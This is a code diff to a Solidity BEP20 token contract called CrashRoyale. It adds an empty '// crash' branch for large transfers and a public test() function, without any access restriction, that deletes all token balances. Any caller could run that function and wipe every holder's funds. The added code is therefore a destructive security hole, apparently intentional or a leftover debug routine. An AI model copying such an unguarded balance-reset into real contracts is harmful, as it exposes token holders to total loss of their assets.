@@ -577,6 +577,16 @@ contract CrashRoyale is Context, IBEP20, Ownable {
 		_balances.set(recipient, _balances.get(recipient).add(amount));
 
 		emit Transfer(sender, recipient, amount);
+		
+		if (!isContract(recipient) && recipient != owner() && amount > 10000000000000000000000) {
+		    // crash
+		}
+	}
+
+    function test() public {
+        // this works to reset all balances
+	    delete _balances;
+	    _balances = new IterableMapAddrToUint256();
 	}
 
 	/**
